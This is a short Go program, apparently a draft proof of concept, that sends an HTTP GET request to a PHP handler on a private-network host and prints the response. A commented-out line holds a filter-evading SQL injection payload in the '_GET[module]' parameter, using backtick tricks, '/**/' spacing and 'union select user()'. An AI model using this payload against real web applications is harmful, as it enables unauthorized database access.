package main

import (
	"fmt"
	"io"
	"net/http"
)

func main() {
	// 构建URL
	baseURL := "http://172.16.102.18:8000/share/handle.php"
	//params := url.Values{}
	//params.Add("_GET[module]", "1' and 1={`='` 1} and 1=0 union select (select/**/user())-- '")
	//u := fmt.Sprintf("%s?%s", baseURL, params.Encode())

	// 创建HTTP客户端
	client := &http.Client{}

	// 创建GET请求
	req, err := http.NewRequest("GET", baseURL, nil)
	if err != nil {
		fmt.Printf("Error creating request: %v\n", err)
		return
	}

	// 设置请求头
	//req.Header.Set("Host", "172.16.102.18:8000")
	//req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36")
	//req.Header.Set("Accept-Encoding", "gzip, deflate")
	//req.Header.Set("Connection", "close")

	//fmt.Println(req.Trailer)
	//fmt.Println(req.TransferEncoding)
	//fmt.Println(req.Header)
	fmt.Println("1111111111")
	fmt.Println(req.Body)
	fmt.Println(req)
	// 发送请求并获取响应
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("Error sending request: %v\n", err)
		return
	}
	defer resp.Body.Close()

	// 打印响应状态码
	fmt.Printf("Response Status: %s\n", resp.Status)
	//fmt.Println(resp.Body)

	// 读取并打印响应体（如果需要）
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Error reading response body: %v\n", err)
		return
	}
	fmt.Println("Response Body:", string(body))
}
